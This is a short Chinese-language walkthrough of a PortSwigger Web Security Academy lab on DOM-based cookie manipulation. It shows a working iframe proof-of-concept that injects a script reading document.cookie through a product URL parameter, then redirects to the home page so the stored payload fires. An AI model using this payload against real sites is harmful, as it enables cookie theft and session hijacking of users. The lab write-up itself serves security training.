

![](https://raw.githubusercontent.com/h1iba1/h1iba1.github.io/refs/heads/master/_posts/portswigger-labs/基于DOM的漏洞/images/0E4E58996B544A9EBE3FDD350ABB89EFclipboard.png)

首页的js脚本，将url地址获取的值存入cookie，可能造成危害



![](https://raw.githubusercontent.com/h1iba1/h1iba1.github.io/refs/heads/master/_posts/portswigger-labs/基于DOM的漏洞/images/5FB4AC813573452889D61B47DE53E955clipboard.png)

last viewed product按钮存在xss漏洞



所以可以构造poc：

```javascript
<iframe src="https://ac5b1fa21e194aa1815019e100d200dc.web-security-academy.net/product?productId=1
&'><script>alert(document.cookie)</script>" 
onload="if(!window.x)
this.src='https://ac5b1fa21e194aa1815019e100d200dc.web-security-academy.net';
window.x=1;">
```

当受害者访问该poc时。iframe标签加载xss。之后重定向到网站首页